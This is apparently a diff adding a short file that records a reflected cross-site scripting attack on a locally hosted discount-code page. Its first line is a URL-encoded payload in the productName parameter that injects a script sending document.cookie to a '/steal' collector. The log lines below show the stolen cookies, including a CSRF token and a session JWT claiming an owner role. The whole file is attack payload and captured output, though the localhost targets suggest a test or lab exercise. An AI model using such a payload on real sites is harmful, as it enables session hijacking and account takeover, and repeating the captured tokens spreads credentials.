@@ -1,0 +1,9 @@
+http://localhost:8082/danh-sach-ma-giam-gia?activeTab=product-discount&productName=%22%3E%3Cscript%3Efetch%28%27http%3A%2F%2Flocalhost%3A8000%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%29.catch%28console.error%29%3C%2Fscript%3E
+2025-05-20 16:56:22,883 - No cookie data received.
+2025-05-20 17:02:46,329 - Received cookies:
+2025-05-20 17:02:46,329 - ajs_anonymous_id = 084a5a42-bc16-426c-9319-2f466627286a
+2025-05-20 17:02:46,329 - csrftoken = WjA2XzhLxFtb3XQBPIDBqETDbyvkGIoa
+2025-05-20 17:02:46,329 - language = en
+2025-05-20 17:02:46,329 - welcomebanner_status = dismiss
+2025-05-20 17:02:46,329 - cookieconsent_status = dismiss
+2025-05-20 17:02:46,330 - token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6Ik9XTkVSIiwiZXhwIjoxNzQ3NzM4ODI4LCJpYXQiOjE3NDc3MzUyMjgsImp0aSI6ImJkOTFiOTA1LTMzMjMtNGU1OS04MTUxLTYwYzk0MDkxMjBmYyJ9.CirLgw1NvfGLAEGUJKX7q8J348PIQg-YiQXt4jbEyvk
